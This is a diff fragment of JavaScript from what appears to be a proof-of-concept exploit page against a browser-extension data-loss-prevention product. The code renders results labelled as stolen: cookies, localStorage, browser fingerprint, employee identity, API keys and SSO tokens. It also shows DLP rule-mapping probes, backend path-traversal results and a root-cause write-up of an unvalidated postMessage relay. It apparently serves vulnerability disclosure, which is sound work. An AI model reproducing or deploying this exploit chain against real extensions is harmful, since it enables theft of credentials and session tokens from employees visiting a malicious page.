+  badge('b10', authResult ? 'TOKEN CAPTURED' : 'TRIGGERED', 'bdone');
 
   // ===== COMPLETE =====
   const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
@@ -501,6 +724,41 @@ async function runChain() {
   html += '<div style="color:#fa0;font-size:11px;font-family:monospace">' + D.functionsUsed.join(', ') + '</div>';
   html += '<div style="color:#666;font-size:10px;margin-top:2px">All invoked via postMessage relay — zero origin validation, zero authentication</div></div>';
 
+  // Browser fingerprint
+  if (D.browser) {
+    html += '<div class="data-section"><h4>STOLEN: BROWSER FINGERPRINT & SESSION</h4>';
+    for (const [k, v] of Object.entries(D.browser)) {
+      if (v !== null && v !== undefined && v !== '')
+        html += '<div class="kv"><div class="k">' + k + '</div><div class="v">' + (typeof v === 'object' ? JSON.stringify(v) : v) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // Cookies
+  if (D.cookies && D.cookies.length > 5) {
+    html += '<div class="data-section"><h4>STOLEN: COOKIES (current origin)</h4>';
+    html += '<div style="color:#f34;font-size:11px;font-family:monospace;word-break:break-all">' + D.cookies + '</div>';
+    html += '</div>';
+  }
+
+  // localStorage
+  if (D.localStorageKeys && Object.keys(D.localStorageKeys).length > 0) {
+    html += '<div class="data-section"><h4>STOLEN: localStorage (' + Object.keys(D.localStorageKeys).length + ' entries)</h4>';
+    for (const [k, v] of Object.entries(D.localStorageKeys)) {
+      html += '<div class="kv"><div class="k">' + k + '</div><div class="v">' + v.slice(0, 120) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // Extension DOM leaks
+  if (D.extensionDomData && Object.keys(D.extensionDomData).length > 0) {
+    html += '<div class="data-section"><h4>STOLEN: EXTENSION DOM DATA-ATTRIBUTES</h4>';
+    for (const [k, v] of Object.entries(D.extensionDomData)) {
+      html += '<div class="kv"><div class="k">' + k + '</div><div class="v">' + v + '</div></div>';
+    }
+    html += '</div>';
+  }
+
   // Identity
   if (D.identity) {
     html += '<div class="data-section"><h4>STOLEN: EMPLOYEE IDENTITY</h4>';
@@ -515,6 +773,16 @@ async function runChain() {
     html += '<div class="data-section"><h4>STOLEN: API CREDENTIALS</h4>';
     for (const [k, v] of Object.entries(D.popupSettings)) {
       html += '<div class="kv"><div class="k">' + k + '</div><div class="v" style="' + (k === 'apiKey' ? 'color:#f34' : '') + '">' + (v === undefined ? '(MDM-hidden)' : v) + '</div></div>';
+    }
+    html += '</div>';
+  }
+
+  // SSO token
+  if (D.ssoResult && typeof D.ssoResult === 'object') {
+    html += '<div class="data-section"><h4>STOLEN: SSO / AUTHENTICATION TOKENS</h4>';
+    for (const [k, v] of Object.entries(D.ssoResult)) {
+      const isSensitive = k.includes('token') || k.includes('Token');
+      html += '<div class="kv"><div class="k">' + k + '</div><div class="v" style="' + (isSensitive ? 'color:#f34' : '') + '">' + (typeof v === 'object' ? JSON.stringify(v).slice(0, 100) : String(v).slice(0, 100)) + '</div></div>';
     }
     html += '</div>';
   }
@@ -544,13 +812,54 @@ async function runChain() {
   html += '<div style="color:#f34;font-size:11px;font-family:monospace;margin-top:2px">Blind spots (' + D.unmonitored.length + '): ' + D.unmonitored.join(', ') + '</div>';
   html += '</div>';
 
-  // DLP probes
-  html += '<div class="data-section"><h4>DLP RULE MAP (' + D.probes.length + ' payloads tested)</h4>';
+  // DLP text probes
+  html += '<div class="data-section"><h4>DLP RULE MAP — TEXT (' + D.probes.length + ' payloads)</h4>';
   for (const p of D.probes) {
     const color = p.status === 'BLOCKED' ? '#f34' : p.status === 'MODIFIED' ? '#fa0' : '#0f8';
     html += '<div style="color:' + color + ';font-size:11px;font-family:monospace">[' + p.category + '] ' + p.name + ': ' + p.status + '</div>';
   }
   html += '</div>';
+
+  // File probes
+  if (D.fileProbes.length > 0) {
+    html += '<div class="data-section"><h4>DLP RULE MAP — FILES (' + D.fileProbes.length + ' uploads)</h4>';
+    for (const f of D.fileProbes) {
+      const color = f.status === 'BLOCKED' ? '#f34' : f.status === 'SCANNED' ? '#fa0' : '#888';
+      html += '<div style="color:' + color + ';font-size:11px;font-family:monospace">' + f.name + ' (' + f.mime + '): ' + f.status + '</div>';
+    }
+    html += '</div>';
+  }
+
+  // Response probes
+  if (D.responseProbes.length > 0) {
+    html += '<div class="data-section"><h4>DLP RULE MAP — RESPONSE INSPECTION (' + D.responseProbes.length + ' tests)</h4>';
+    for (const rp of D.responseProbes) {
+      const color = rp.status === 'FILTERED' ? '#fa0' : '#0f8';
+      html += '<div style="color:' + color + ';font-size:11px;font-family:monospace">' + rp.name + ': ' + rp.status + '</div>';
+    }
+    html += '</div>';
+  }
+
+  // MCP / Backend results
+  if (D.mcpResults.length > 0) {
+    html += '<div class="data-section"><h4>BACKEND API PATH TRAVERSAL (' + D.mcpResults.filter(m=>m.responded).length + '/' + D.mcpResults.length + ' responded)</h4>';
+    for (const m of D.mcpResults) {
+      const color = m.responded ? '#f34' : '#888';
+      html += '<div style="color:' + color + ';font-size:11px;font-family:monospace">' + m.api + ': ' + (m.responded ? 'RESPONSE — ' + (m.data||'').slice(0,80) : 'timeout') + '</div>';
+    }
+    html += '</div>';
+  }
+
+  // Performance entries (browsing signals)
+  if (D.performanceEntries && D.performanceEntries.length > 0) {
+    const extEntries = D.performanceEntries.filter(e => e.name.includes('chrome-extension') || e.name.includes('prompt'));
+    html += '<div class="data-section"><h4>RESOURCE TIMING (' + D.performanceEntries.length + ' entries, ' + extEntries.length + ' extension-related)</h4>';
+    html += '<div style="color:#888;font-size:10px">Reveals loaded resources including extension activity</div>';
+    for (const e of extEntries.slice(0, 8)) {
+      html += '<div style="color:#fa0;font-size:10px;font-family:monospace;margin-top:2px">' + e.name.slice(0, 100) + ' (' + e.duration + 'ms, ' + e.size + 'b)</div>';
+    }
+    html += '</div>';
+  }
 
   // Root cause
   html += '<div class="data-section"><h4>ROOT CAUSE</h4>';
@@ -560,7 +869,7 @@ async function runChain() {
   html += '2. Forwards the message to the background service worker via <code style="color:#fa0;background:#1a1020;padding:1px 4px;border-radius:2px">chrome.runtime.sendMessage</code><br>';
   html += '3. Broadcasts the response back via <code style="color:#fa0;background:#1a1020;padding:1px 4px;border-radius:2px">postMessage("*")</code><br><br>';
   html += '<b style="color:#f34">There is zero origin validation.</b> Any JavaScript on any webpage can invoke any of the ' + D.functionsUsed.length + ' privileged extension operations and receive the responses. ';
-  html += 'The DLP product designed to protect the organization becomes the attack surface.';
+  html += 'Combined with standard browser APIs (cookies, localStorage, fingerprinting, WebRTC), a single page visit exfiltrates the employee\'s complete digital identity, security posture, and browser session data.';
   html += '</div></div>';
 
   exData.innerHTML = html;
